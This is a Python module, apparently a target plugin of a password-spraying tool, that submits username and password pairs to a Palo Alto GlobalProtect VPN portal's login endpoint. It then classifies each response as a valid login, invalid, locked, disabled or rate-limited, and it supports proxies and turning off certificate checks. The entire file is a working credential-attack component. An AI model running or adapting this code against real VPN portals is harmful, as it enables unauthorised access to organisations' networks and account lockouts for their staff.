"""
Palo Alto GlobalProtect VPN portal spray target.

GP portal exposes `/global-protect/login.esp` returning XML or HTML.
A successful auth typically returns 200 with `<status>Success</status>` or sets
a `PHPSESSID` / `prelogin-cookie`. Failed auth returns an error XML.
"""
import requests

from . import DEFAULT_TIMEOUT as _TIMEOUT


def attempt(
    username: str,
    password: str,
    base_url: str,
    proxies: dict | None = None,
    headers: dict | None = None,
    verify: bool = True,
) -> dict:
    """
    Returns dict with keys: success (bool), locked (bool), notes (str).
    base_url should be like https://vpn.company.com (no trailing slash).
    """
    url = f"{base_url.rstrip('/')}/global-protect/login.esp"
    data = {
        "prot": "https:",
        "server": base_url.split("//", 1)[-1].rstrip("/"),
        "inputStr": "",
        "action": "getsoftware",
        "user": username,
        "passwd": password,
        "ok": "Log In",
    }
    try:
        r = requests.post(
            url, data=data, allow_redirects=False, timeout=_TIMEOUT,
            verify=verify, proxies=proxies, headers=headers,
        )
    except Exception as e:
        return {"success": False, "locked": False, "notes": f"request error: {e}"}

    if r.status_code == 429:
        return {"success": False, "locked": False, "notes": "rate_limited"}

    body = r.text or ""
    body_lower = body.lower()

    if "lock" in body_lower or "disabled" in body_lower:
        return {"success": False, "locked": True, "notes": "locked/disabled"}

    if "<status>Success</status>" in body:
        return {"success": True, "locked": False, "notes": "valid"}

    # Successful auth on some firmware versions returns a hex-encoded cookie body.
    if r.status_code == 200 and "argument" in body and "auth-cookie" in body:
        return {"success": True, "locked": False, "notes": "valid (auth-cookie returned)"}

    if "Invalid" in body or "fail" in body_lower or r.status_code == 512:
        return {"success": False, "locked": False, "notes": "invalid"}

    return {"success": False, "locked": False, "notes": f"status={r.status_code}"}
